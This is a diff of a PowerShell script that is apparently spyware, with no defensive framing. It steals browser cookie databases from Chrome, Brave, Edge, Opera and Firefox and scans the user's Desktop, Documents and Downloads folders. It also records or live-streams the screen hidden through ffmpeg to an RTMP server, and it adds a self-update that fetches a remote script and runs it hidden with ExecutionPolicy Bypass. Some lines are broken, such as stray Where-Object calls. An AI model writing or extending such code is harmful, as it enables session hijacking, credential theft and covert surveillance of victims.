@@ -16,34 +16,50 @@ New-Item -ItemType Directory -Force -Path $tempDir, $shotsDir, $cookieDir    | O
 Start-Transcript -Path "$tempDir\session.log" -Append
 Write-Output "[*] Started at $(Get-Date)"
 
-function Get-ChromeCookies {
-    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
-    if (-not (Test-Path $cookieDir)) {
-    New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
-    }
-    if (Test-Path $path) {
-        $chromeCopy = "$cookieDir\chrome.sqlite"
-    Copy-Item $path $chromeCopy -Force -ErrorAction SilentlyContinue
-    if (Test-Path $chromeCopy) { Write-Output "Chrome cookies saved: $chromeCopy" }
-    }
+function Find-Cookies {
+    param ([string]$base, [string]$prefix)
+
+    if (-not (Test-Path $base)) { return }
+
+    Get-ChildItem -Path $base -Recurse -Include "Cookies" -File -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            $target = "$cookieDir\$prefix$($_.FullName -replace '[\\/:*?"<>|]', '_')"
+            try {
+                Copy-Item $_.FullName $target -Force -ErrorAction SilentlyContinue
+                Write-Output "Copied cookie file: $($_.FullName)"
+            } catch {
+                Write-Warning "Failed to copy cookie file: $($_.FullName)"
+                Where-Object { $_.Length -gt 1024 }
+            }
+        }
 }
 
-function Get-FirefoxCookies {
-    $profiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (-not (Test-Path $cookieDir)) {
-    New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
+function Get-ChromeLikeCookies {
+    $targets = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable"
+    )
+    foreach ($path in $targets) {
+        Find-Cookies -base $path -prefix ([IO.Path]::GetFileName($path) + "_")
     }
-    if (Test-Path $profiles) {
-        Get-ChildItem -Directory $profiles | ForEach-Object {
-            $cookieFile = "$($_.FullName)\cookies.sqlite"
-            if (Test-Path $cookieFile) {
-                Write-Output "Found cookie at: $path"
-                Test-Path $cookieDir
-                Copy-Item $cookieFile "$cookieDir\firefox_$($_.Name).sqlite" -Force
-            }
+}
+function Get-FirefoxCookies {
+    $base = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (-not (Test-Path $base)) { return }
+
+    Get-ChildItem -Path $base -Directory | ForEach-Object {
+        $cookieFile = Join-Path $_.FullName "cookies.sqlite"
+        if (Test-Path $cookieFile) {
+            $name = "firefox_$($_.Name).sqlite"
+            Copy-Item $cookieFile "$cookieDir\$name" -Force -ErrorAction SilentlyContinue
+            Write-Output "Copied Firefox cookies: $name"
+            Where-Object { $_.Length -gt 1024 }
         }
     }
 }
+
 
 function Scan-Files {
     $targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
@@ -69,10 +85,10 @@ function Scan-Files {
 
 function Get-SystemReport {
     try {
-        $os = Get-CimInstance Win32_OperatingSystem
-        $cpu = Get-CimInstance Win32_Processor
-        $net = Get-NetTCPConnection | Select-Object -First 20
-        $procs = Get-Process | Sort CPU -Descending | Select Name, Id, CPU -First 20
+        $os = Get-WmiObject Win32_OperatingSystem
+        $cpu = Get-WmiObject Win32_Processor
+        $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 -Property Name, Id, CPU
+        $net = Get-NetTCPConnection -ErrorAction SilentlyContinue | Select-Object -First 10
 
         return [PSCustomObject]@{
             user = $env:USERNAME
@@ -86,7 +102,7 @@ function Get-SystemReport {
             net = $net
         }
     } catch {
-        Write-Warning "System report failed: $_"
+        Write-Warning "Get-SystemReport failed: $_"
         return $null
     }
 }
@@ -125,22 +141,15 @@ Start-Job -ScriptBlock {
 function Start-Recording {
     param([string]$Mode = "record")
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
-    if (!(Test-Path $ffmpeg)) {
-        Write-Warning "ffmpeg not found"
-        return
-    }
+    if (!(Test-Path $ffmpeg)) { Write-Warning "ffmpeg not found"; return }
 
     if ($Mode -eq "record") {
         $output = "$tempDir\screen_capture.mp4"
-        $proc = Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
-            -ArgumentList "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 `"$output`"" -PassThru
+        $args = "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 `"$output`""
+        $proc = Start-Process -FilePath $ffmpeg -ArgumentList $args -WindowStyle Hidden -PassThru
         $proc.WaitForExit()
     } elseif ($Mode -eq "stream") {
-        $proc = Start-Process -FilePath $ffmpeg -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/wqrj-k80s-cwwq-7wct-3rc8" -WindowStyle Hidden -NoNewWindow -PassThru
-        $proc.WaitForExit()
-            -RedirectStandardOutput "$tempDir\stream.log" `
-            -RedirectStandardError "$tempDir\stream_error.log" `
-            -WindowStyle Hidden
+        Start-Process -FilePath $ffmpeg -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY" -WindowStyle Hidden
     }
 }
 function Archive-And-Upload {
@@ -263,7 +272,7 @@ function Cleanup {
 
 # === MAIN LOOP ===
 while ($true) {
-    Get-ChromeCookies
+    Get-ChromeLikeCookies
     Get-FirefoxCookies
     Scan-Files
 
@@ -283,10 +292,13 @@ while ($true) {
         try {
             Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
             Write-Output "Self-update complete"
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$local`"" -WindowStyle Hidden
+            exit
         } catch {
-            Write-Warning "Self-update failed"
+            Write-Warning "Self-update failed: $_"
         }
     }
+
 
     Self-Update
     Write-Output "Restarting after update..."
